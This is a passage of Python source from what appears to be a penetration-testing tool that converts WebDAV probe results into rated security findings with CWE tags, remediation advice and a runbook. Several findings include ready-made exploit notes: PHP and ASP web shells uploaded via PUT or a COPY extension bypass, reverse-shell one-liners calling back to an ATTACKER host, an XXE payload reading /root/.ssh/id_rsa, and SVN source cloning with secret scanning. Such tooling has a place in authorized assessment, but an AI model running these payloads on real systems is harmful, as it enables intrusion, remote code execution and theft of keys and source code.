        "extension (.asp/.aspx/.php) that a direct PUT would have blocked. The "
        "upload-filter bypass is the CVE-2017-7269 / mod_dav class."),
    "webdav_xxe": (
        "The PROPFIND XML parser resolved an external entity and echoed the "
        "referenced file's contents back inside the multistatus response. This is "
        "arbitrary file read, SSRF, and a billion-laughs DoS surface."),
    "webdav_auth_scheme": (
        "The mount challenges with HTTP Basic (or Digest) over cleartext. Any "
        "credential submitted is captured on the wire; feed the realm into the "
        "credential-quickconnect / spray path."),
    "webdav_fingerprint": (
        "The WebDAV backend is fingerprinted (IIS / mod_dav / mod_dav_svn / "
        "SabreDAV / Nextcloud). Product + version steer subsequent CVE mapping."),
    "webdav_lock_open": (
        "LOCK against a non-existent path was accepted unauthenticated. A lock-null "
        "resource can persist and block legitimate PUT/MKCOL on the same URL - "
        "denial of service and a foothold for lock-based race conditions."),
    "webdav_svn_exposed": (
        "The mod_dav_svn repository exposes /!svn/vcc/default or /.svn/entries "
        "anonymously - full source-tree leak, commit history, author identities."),
    "webdav_if_header_bypass": (
        "A PROPFIND that returned 401 unauthenticated returned 207 when the same "
        "request carried an If: header with a bogus lock token. This is the "
        "CVE-2017-7269-adjacent URL-canonicalisation bypass class."),
    "webdav_href_leak": (
        "PROPFIND enumeration surfaced sensitive filenames inside the mount "
        "(.git, .env, wp-config.php, backup/, .htpasswd) that a normal crawl would "
        "miss."),
    "webdav_user_leak": (
        "PROPFIND responses embed <D:creator-displayname> for every resource - "
        "the mount leaks the list of legitimate users (SVN authors / Nextcloud "
        "owner UIDs) for onward spraying."),
}

_finding = finding_builder("webdav", _NARRATIVE)


def _known_cve_for_backend(backend: dict) -> tuple[str, list[str]]:
    """Return (cve_note, extra_cwes) for a fingerprinted backend."""
    prod = backend.get("product", "")
    if prod == "Microsoft-IIS/6.0":
        return ("CVE-2017-7269 (IIS 6.0 WebDAV ScStoragePathFromUrl RCE)",
                ["CWE-119"])
    return ("", [])


def findings(hosts: list[Host], probe_map: dict | None = None) -> list[dict]:
    probe_map = probe_map or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_webdav(p):
                continue
            pr = probe_map.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"
            caps = pr.get("caps") or {}
            backend = pr.get("backend") or {}

            # Fingerprint always emitted (info) so presence is in the report.
            if backend.get("product"):
                out.append(_finding(
                    "info",
                    f"WebDAV backend fingerprint: {backend['product']}"
                    + (f" {backend['version']}" if backend.get('version') else ""),
                    tgt,
                    (f"OPTIONS / -> Server: {caps.get('server','?')}"
                     + (f" | X-Dav-Powered-By: {caps['x_dav_powered_by']}"
                        if caps.get('x_dav_powered_by') else "")
                     + (f" | Sabre: {caps['x_sabre_version']}"
                        if caps.get('x_sabre_version') else "")
                     + (f" | MS-Author-Via: {caps['ms_author_via']}"
                        if caps.get('ms_author_via') else "")
                     + (f"\n{backend['note']}" if backend.get("note") else "")),
                    "curl", f"curl -sI -X OPTIONS http://{h.ip}:{p.portid}/",
                    "Restrict WebDAV to authenticated principals and prefer disabling "
                    "on public endpoints.",
                    ["CWE-200"], kind="webdav_fingerprint"))

            # Low-severity "enabled" marker.
            dav_hdr = ",".join(caps.get("dav", [])) or "-"
            allow_hdr = ",".join(caps.get("allow", [])) or "-"
            out.append(_finding(
                "low", "WebDAV enabled (OPTIONS/PROPFIND accepted)", tgt,
                f"OPTIONS reported DAV: {dav_hdr}; Allow: {allow_hdr}. "
                f"{len(pr.get('mounts') or [])} mount(s) confirmed via PROPFIND.",
                "curl",
                f"curl -sI -X OPTIONS http://{h.ip}:{p.portid}/ ; "
                f"curl -X PROPFIND -H 'Depth: 1' http://{h.ip}:{p.portid}/",
                "Disable WebDAV on public endpoints unless explicitly required.",
                ["CWE-650"], kind="webdav_enabled"))

            # Depth:infinity walk.
            di = pr.get("depth_infinity")
            if di and di.get("href_count", 0) > 1:
                proof = di.get("get_proof") or []
                tier = "t2" if proof else "t1"
                detail = (
                    f"PROPFIND {di['path']} with Depth: infinity returned "
                    f"{di['href_count']} href(s) in {di['size']} bytes. Sample: "
                    + ", ".join(di["hrefs_sample"][:8]))
                if proof:
                    detail += (
                        "\n\nSAFE proof (unauthenticated GET on the classified "
                        "sensitive hrefs — bounded read, no writes):")
                    for pp in proof[:3]:
                        detail += (
                            f"\n  GET {pp['path']} -> HTTP {pp['status']} "
                            f"({pp['size']} bytes); excerpt: "
                            f"{pp['excerpt'][:160]!r}")
                out.append(_finding(
                    "high",
                    "WebDAV directory tree disclosed via PROPFIND Depth: infinity",
                    tgt,
                    detail,
                    "curl",
                    f"curl -X PROPFIND -H 'Depth: infinity' "
                    f"http://{h.ip}:{p.portid}{di['path']}",
                    "Cap Depth to 1 (Apache: DavDepthInfinity Off; nginx dav_ext: "
                    "cap depth; IIS: 'Allow Depth: infinity' unchecked).",
                    ["CWE-548", "CWE-538"], kind="webdav_directory_enum",
                    exploit_note=(
                        "curl -sSk -X PROPFIND -H 'Depth: infinity' "
                        "http://IP:PORT/webdav/ | grep -oE '<D:href>[^<]+' ; "
                        "for h in $(above); do curl -sSk http://IP:PORT$h; "
                        "done"),
                    depth_tier=tier))

            # Verb enum.
            verbs = (pr.get("verbs") or {}).get("statuses") or {}
            accepted = [v for v, s in verbs.items()
                        if v in _WRITE_METHODS and s in (200, 201, 204, 207)]
            if accepted:
                out.append(_finding(
                    "high",
                    f"WebDAV dangerous verbs accepted: {', '.join(sorted(accepted))}",
                    tgt,
                    "Empirical verb test on a randomised /recce_dav_probe_* path: "
                    + ", ".join(f"{v}={verbs[v]}" for v in sorted(verbs)),
                    "curl",
                    f"curl -X MKCOL http://{h.ip}:{p.portid}/recce_dav_probe/",
                    "Restrict write verbs (MKCOL/COPY/MOVE/PUT/DELETE/PROPPATCH) to "
                    "authenticated principals; remove WebDAV where not needed.",
                    ["CWE-650"], kind="webdav_verbs_enabled",
                    exploit_note=(
                        "curl -sSk -X MKCOL http://IP:PORT/recce_probe/ ; "
                        "curl -sSk -X PUT --data 'x' "
                        "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
                        "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
                        "-X DELETE http://IP:PORT/recce_probe/x.txt"),
                    depth_tier="t1"))
                if verbs.get("MKCOL") == 201:
                    out.append(_finding(
                        "high",
                        "WebDAV MKCOL - writable collection creation allowed", tgt,
                        "MKCOL /recce_dav_probe_* returned 201 Created; DELETE "
                        "removed it in cleanup.",
                        "curl",
                        f"curl -X MKCOL http://{h.ip}:{p.portid}/recce_dav_probe/",
                        "Deny MKCOL to unauthenticated users (or all users on a "
                        "read-only mount).", ["CWE-434", "CWE-650"],
                        kind="webdav_mkcol_allowed",
                        exploit_note=(
                            "curl -sSk -X MKCOL http://IP:PORT/recce_probe/ "
                            "; curl -sSk -X PUT --data 'x' "
                            "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
                            "http://IP:PORT/recce_probe/x.txt ; curl -sSk "
                            "-X DELETE http://IP:PORT/recce_probe/x.txt"),
                        depth_tier="t1"))

            # Anonymous PUT proof.
            anon = pr.get("anon_put") or {}
            if anon.get("proven"):
                out.append(_finding(
                    "critical",
                    "Anonymous WebDAV PUT - arbitrary file write (proven)", tgt,
                    anon.get("note", ""),
                    "curl",
                    f"curl -X PUT --data 'x' "
                    f"http://{h.ip}:{p.portid}{anon.get('path','/recce_dav_probe.txt')}",
                    "Require authentication for PUT (or disable it entirely). If "
                    "the mount backs a web root, isolate it from any executable "
                    "handler mapping.",
                    ["CWE-434", "CWE-306", "CWE-650"], kind="webdav_anon_put",
                    exploit_note=(
                        "curl -sSk -X PUT --data '<?php system($_GET[c]); "
                        "?>' http://IP:PORT/webdav/s.php ; curl -sSk "
                        "'http://IP:PORT/webdav/s.php?c=bash -c \"bash -i "
                        ">& /dev/tcp/ATTACKER/4444 0>&1\"'"),
                    depth_tier="t2"))

            # RCE.
            rce = pr.get("rce") or {}
            if rce.get("proven"):
                cve, extra_cwes = _known_cve_for_backend(backend)
                detail = rce.get("note", "")
                if cve:
                    detail += f"\n\nBackend fingerprint suggests {cve}."
                out.append(_finding(
                    "critical",
                    f"WebDAV PUT -> {rce.get('ext','script').upper()} execution (RCE proven)",
                    tgt, detail, "curl",
                    f"curl -X PUT --data '<shell>' http://{h.ip}:{p.portid}{rce.get('path','')}"
                    " ; curl http://" + h.ip + ":" + str(p.portid) + rce.get("path", ""),
                    "Remove WebDAV write access on any path that maps to a script "
                    "handler. Enforce authentication + a strict upload allowlist.",
                    ["CWE-434", "CWE-94", "CWE-78"] + extra_cwes,
                    kind="webdav_put_rce",
                    exploit_note=(
                        "nc -lvnp 4444 & curl -sSk -X PUT --data "
                        "'<?php exec(\"bash -c \\\"bash -i >& "
                        "/dev/tcp/ATTACKER/4444 0>&1\\\"\"); ?>' "
                        "http://IP:PORT/webdav/rev.php ; curl -sSk "
                        "http://IP:PORT/webdav/rev.php"),
                    depth_tier="t2"))

            # COPY/MOVE upload-filter bypass.
            cpy = pr.get("copy_bypass") or {}
            if cpy.get("proven"):
                out.append(_finding(
                    "critical",
                    "WebDAV COPY/MOVE upload-filter bypass",
                    tgt, cpy.get("note", ""), "curl",
                    f"curl -X PUT --data 'x' http://{h.ip}:{p.portid}/probe.txt ; "
                    f"curl -X COPY -H 'Destination: http://{h.ip}:{p.portid}/probe.{cpy['ext']}' "
                    f"http://{h.ip}:{p.portid}/probe.txt",
                    "Apply upload extension filtering AFTER canonicalisation, and "
                    "block COPY/MOVE across extension boundaries. On IIS 6.0, "
                    "patch MS17-010-adjacent WebDAV CVEs or disable the module.",
                    ["CWE-434", "CWE-73"], kind="webdav_copy_bypass",
                    exploit_note=(
                        "curl -sSk -X PUT --data '<%eval request(\"c\")%>' "
                        "http://IP:PORT/x.txt ; curl -sSk -X COPY -H "
                        "'Destination: http://IP:PORT/x.asp' "
                        "http://IP:PORT/x.txt ; curl -sSk "
                        "'http://IP:PORT/x.asp?c=whoami'"),
                    depth_tier="t2"))

            # PROPFIND XXE.
            xxe = pr.get("xxe") or {}
            if xxe.get("hit"):
                out.append(_finding(
                    "high",
                    "WebDAV PROPFIND XML External Entity (XXE)", tgt,
                    f"PROPFIND with an external-entity XML body returned "
                    f"/etc/passwd content inside the multistatus response. "
                    f"Excerpt: {xxe['excerpt'][:200]}",
                    "curl",
                    f"curl -X PROPFIND -H 'Depth: 0' -H 'Content-Type: application/xml' "
                    f"--data-binary @xxe.xml http://{h.ip}:{p.portid}/",
                    "Disable external-entity resolution in the XML parser "
                    "(defusedxml / disallow-doctype-decl / SabreDAV upgrade).",
                    ["CWE-611", "CWE-918"], kind="webdav_xxe",
                    exploit_note=(
                        "cat > xxe.xml <<'EOF'\n<?xml version=\"1.0\"?>"
                        "<!DOCTYPE r [<!ENTITY x SYSTEM "
                        "\"file:///root/.ssh/id_rsa\">]>"
                        "<D:propfind xmlns:D=\"DAV:\"><D:prop>"
                        "<D:displayname>&x;</D:displayname>"
                        "</D:prop></D:propfind>\nEOF\n"
                        "curl -sSk -X PROPFIND -H 'Content-Type: "
                        "application/xml' --data-binary @xxe.xml "
                        "http://IP:PORT/"),
                    depth_tier="t2"))

            # Auth scheme (Basic over cleartext).
            schemes = pr.get("auth_schemes") or []
            basic = next((s for s in schemes if s["scheme"].lower() == "basic"), None)
            use_tls = _probes._is_tls(p)
            if basic and not use_tls:
                out.append(_finding(
                    "medium",
                    "WebDAV Basic auth over cleartext channel", tgt,
                    f"WWW-Authenticate offered Basic realm=\"{basic.get('realm','')}\""
                    " on a plain-HTTP endpoint - credentials cross the wire in "
                    "base64.", "curl",
                    f"curl -u user:pass http://{h.ip}:{p.portid}/",
                    "Serve WebDAV only over HTTPS, prefer Digest/Kerberos over "
                    "Basic, and never accept credentials on plain HTTP.",
                    ["CWE-319", "CWE-522"], kind="webdav_auth_scheme"))

            # Lock-null resources.
            if pr.get("lock_open"):
                out.append(_finding(
                    "medium",
                    "WebDAV LOCK accepts unauthenticated lock-null resources", tgt,
                    "LOCK against a random /recce_dav_probe_* path returned "
                    "success unauthenticated - lock-null resources can persist and "
                    "block legitimate PUT/MKCOL.", "curl",
                    f"curl -X LOCK -H 'Depth: 0' -H 'Timeout: Second-30' "
                    f"http://{h.ip}:{p.portid}/recce_lock_probe",
                    "Require authentication for LOCK; set a low lock timeout; "
                    "disable locking where unused.",
                    ["CWE-400", "CWE-732"], kind="webdav_lock_open"))

            # SVN exposure.
            svn = pr.get("svn") or {}
            if svn.get("hits"):
                out.append(_finding(
                    "high",
                    "mod_dav_svn repository exposed (anonymous checkout)", tgt,
                    "Subversion metadata reachable without authentication: "
                    + "; ".join(f"{hh['path']} ({hh['size']} bytes)"
                                for hh in svn["hits"][:4]),
                    "svn",
                    f"svn checkout http://{h.ip}:{p.portid}/",
                    "Require authentication on mod_dav_svn (AuthzSVNAccessFile); "
                    "restrict repository read to project members.",
                    ["CWE-538", "CWE-527"], kind="webdav_svn_exposed",
                    exploit_note=(
                        "svn checkout --non-interactive http://IP:PORT/ "
                        "/tmp/svnrepo ; svn log /tmp/svnrepo | awk "
                        "'/^r/{print $3}' | sort -u ; trufflehog "
                        "filesystem /tmp/svnrepo"),
                    depth_tier="t1"))

            # If: header bypass.
            ifb = pr.get("if_bypass") or {}
            if ifb.get("bypassed"):
                out.append(_finding(
                    "high",
                    "WebDAV If: header authentication bypass", tgt,
                    f"PROPFIND returned {ifb['plain_status']} unauthenticated; the "
                    f"same request with a bogus If: header returned "
                    f"{ifb['bypass_status']}. The If: token short-circuits URL "
                    "canonicalisation - CVE-2017-7269-adjacent bypass class.",
                    "curl",
                    f"curl -X PROPFIND -H 'If: (<opaquelocktoken:x>)' "
                    f"-H 'Depth: 0' http://{h.ip}:{p.portid}/",
                    "Upgrade IIS/mod_dav to a version where If:-header parsing "
                    "runs AFTER authentication; deny WebDAV entirely on public "
                    "endpoints.", ["CWE-287", "CWE-284"], kind="webdav_if_header_bypass",
                    exploit_note=(
                        "curl -sSk -X PROPFIND -H 'If: "
                        "(<opaquelocktoken:x>)' -H 'Depth: infinity' "
                        "http://IP:PORT/protected/"),
                    depth_tier="t1"))

            # Sensitive hrefs pivot.
            if pr.get("sensitive"):
                sample = ", ".join(pr["sensitive"][:6])
                out.append(_finding(
                    "medium",
                    "WebDAV hrefs disclose sensitive paths (.git, backup, wp-config)",
                    tgt,
                    f"PROPFIND enumeration surfaced {len(pr['sensitive'])} "
                    f"sensitive path(s): {sample}. Feed these back through the "
                    "HTTP path-enum / config-backup detector for content leak.",
                    "curl",
                    f"curl http://{h.ip}:{p.portid}{pr['sensitive'][0]}",
                    "Remove secret/config files from any DAV-published root; "
                    "audit the tree for backup and VCS metadata.",
                    ["CWE-538"], kind="webdav_href_leak"))

            # Creator-displayname users.
            if pr.get("users"):
                out.append(_finding(
                    "low",
                    "WebDAV PROPFIND leaks creator-displayname user list", tgt,
                    f"{len(pr['users'])} distinct user identifier(s) recovered "
                    "from <D:creator-displayname> elements: "
                    + ", ".join(pr["users"][:10]),
                    "curl",
                    f"curl -X PROPFIND -H 'Depth: 1' http://{h.ip}:{p.portid}/",
                    "Strip creator-displayname from PROPFIND responses on any "
                    "public mount (SVN: SVNPathAuthz off is NOT the fix).",
                    ["CWE-200"], kind="webdav_user_leak"))
    return out


def build_findings(host_ip: str, port: Port, active: bool = True,
                   upload_shell: bool = False, timeout: float = _TIMEOUT) -> list[Vuln]:
    """Single-target convenience: probe + findings + convert to Vuln (source='webdav').
    Matches the http.py:webdav_probe shim pattern described in the punch list."""
    if not is_webdav(port):
        return []
    use_tls = _probes._is_tls(port)
    pr = probe(host_ip, port.portid, use_tls, active=active,
               upload_shell=upload_shell, timeout=timeout)
    if not pr.get("reachable"):
        return []
    fake_host = Host(ip=host_ip, ports=[port])
    fs = findings([fake_host], {(host_ip, port.portid): pr})
    vulns_by_ip = _f2v(fs, "webdav", port.portid)
    return vulns_by_ip.get(host_ip, [])


# ---------------------------------------------------------------------------
# Runbook + top-level analyze

def runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "curl", f"curl -sI -X OPTIONS http://{ip}:{port}/",
         "Read DAV: compliance class and Allow: verb list."),
        ("enumerate", "curl",
         f"curl -X PROPFIND -H 'Depth: 1' -H 'Content-Type: application/xml' "
         f"http://{ip}:{port}/",
         "One-level directory walk without authentication."),
        ("leak", "curl",
         f"curl -X PROPFIND -H 'Depth: infinity' http://{ip}:{port}/webdav/",
         "Full-tree walk of a discovered mount (cap the response)."),
        ("write-probe", "curl",
         f"curl -X PUT --data 'recce-probe' http://{ip}:{port}/recce_probe.txt ; "
         f"curl http://{ip}:{port}/recce_probe.txt ; "
         f"curl -X DELETE http://{ip}:{port}/recce_probe.txt",
         "Prove anonymous write via PUT/GET/DELETE roundtrip."),
        ("loot", "svn / davfs2",
         f"davfs2 http://{ip}:{port}/webdav/ /mnt/dav ; "
         f"# or: svn checkout http://{ip}:{port}/",
         "Mount / clone whatever the mount exposes."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _fn
    return _fn(fs, "webdav", 80)


def _probe_one(t: dict, upload_shell: bool = False) -> dict:
    return probe(t["ip"], t["port"], t.get("use_tls", False),
                 active=True, upload_shell=upload_shell)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            upload_shell: bool = False) -> dict:
    from . import svcprobe
    targets = webdav_targets(hosts)
    probes_out: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets,
                lambda tt: _probe_one(tt, upload_shell=upload_shell),
                budget=budget, progress=progress, state=state):
            if pr and pr.get("reachable"):
                probes_out[(t["ip"], t["port"])] = pr
                t["mounts"] = len(pr.get("mounts") or [])
                t["anon_write"] = bool((pr.get("anon_put") or {}).get("proven"))
                t["rce"] = bool((pr.get("rce") or {}).get("proven"))
                t["backend"] = (pr.get("backend") or {}).get("product", "")
    fs = findings(hosts, probes_out)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes_out.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
